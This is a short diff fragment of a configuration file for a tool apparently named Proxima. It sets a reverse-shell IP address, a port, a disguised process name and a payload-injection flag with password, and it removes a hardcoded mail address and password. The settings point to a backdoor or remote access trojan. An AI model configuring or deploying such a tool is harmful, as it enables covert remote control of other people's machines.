@@ -18,8 +18,5 @@ Proxima.settings.rshellIP = "29.10.19.23"
 Proxima.settings.rshellPort = 1881
 Proxima.settings.rshellProcessName = "prx"
 
-Proxima.settings.userMailAddr = user_mail_address
-Proxima.settings.userMailPassword = "919665"
-
 Proxima.settings.payloadInjection = true
 Proxima.settings.injectionPassword = "30081922"
